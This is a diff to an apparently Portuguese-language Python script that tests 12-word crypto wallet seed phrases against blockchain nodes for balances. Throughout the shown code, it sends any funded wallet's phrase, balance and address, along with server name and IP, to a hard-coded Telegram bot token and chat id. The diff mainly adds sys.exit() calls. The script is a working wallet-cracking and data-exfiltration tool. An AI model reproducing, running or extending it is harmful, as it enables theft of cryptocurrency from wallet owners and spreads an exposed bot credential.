@@ -37,9 +37,11 @@ def send_telegram2(mnemonic,balance,wallet):
     payload = {'chat_id': '139945866', 'text': '🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n\n\n\n\n\n\n\n\n\n\n\n\n\nPhrase:'+str(mnemonic)+' \nBalance: '+str(balance)+' \nWallet: '+str(wallet)+'\n\n\n\n\n\n\n\n\n\n\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢\n🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢🟢'}
     r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)  
     if r.ok:
-        pass
+        sys.exit()
     else:
         send_telegram2(mnemonic,balance,wallet)
+        sys.exit()
+    sys.exit()
 
 def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
     #mnemonic = "luxury rebel tenant boat match antique drop album dress scissors pizza crop"
@@ -64,7 +66,7 @@ def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
     try:
         balance = web3.eth.get_balance(wallet)
     except:
-        pass
+        sys.exit()
     else:
         #print("wallet "+str(wallet)+" balance "+str(web3.from_wei(balance,'ether'))+" mnemonic "+str(mnemonic))
         if balance != 0:
@@ -76,8 +78,10 @@ def chama_api_dos_nodes_para_validar_o_balance(wallet,mnemonic):
             else:
                 send_telegram2(mnemonic,balance,wallet)            
             #arquivo = open("wallet_"+str(id)+".txt", "a")
-            #arquivo.write(str(p1)+" "+str(p2)+" "+str(p3)+" "+str(p4)+" "+str(p5)+" "+str(p6)+" "+str(p7)+" "+str(p8)+" "+str(p9)+" "+str(p10)+" "+str(p11)+" "+str(p12)+"\n")                                    
-    
+            #arquivo.write(str(p1)+" "+str(p2)+" "+str(p3)+" "+str(p4)+" "+str(p5)+" "+str(p6)+" "+str(p7)+" "+str(p8)+" "+str(p9)+" "+str(p10)+" "+str(p11)+" "+str(p12)+"\n")    
+            sys.exit()                                
+    sys.exit()
+
 payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO:\n'+str(serv_name)+': '+str(id)+'\nSERVER: '+str(server)+'\nSERVER IP: '+str(server_ip)+'\nPhrase:'+str(pos01)+'.'+str(pos02)+'.'+str(pos03)+'.'+str(pos04)+'.'+str(pos05)+'.'+str(pos06)+'.'+str(pos07)+'.'+str(pos08)+'.'+str(pos09)+'.'+str(pos10)+'.'+str(pos11)+'.'+str(pos12)+'\nExecutado: '+str(y)+''}
 r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)    
 
@@ -89,9 +93,11 @@ def send_telegram(serv_name,id,y,palavras):
     payload = {'chat_id': '139945866', 'text': '🟢 LOOP ROBO:\n'+str(serv_name)+': '+str(id)+'\nSERVER: '+str(server)+'\nSERVER IP: '+str(server_ip)+'\nPhrase:'+str(palavras)+'\nExecutado: '+str(y)+''}
     r = requests.post("https://api.telegram.org/bot6534285154:AAEzeSG2Nvyn46uGD88VeC2eREAiW80SntA/sendMessage", data=payload)  
     if r.ok:
-        pass
+        sys.exit()
     else:
         send_telegram(serv_name,id,y,palavras)
+        sys.exit()
+    sys.exit()
 
 # RETORNA TRUE OR FALSE
 def valida_array(palavras):
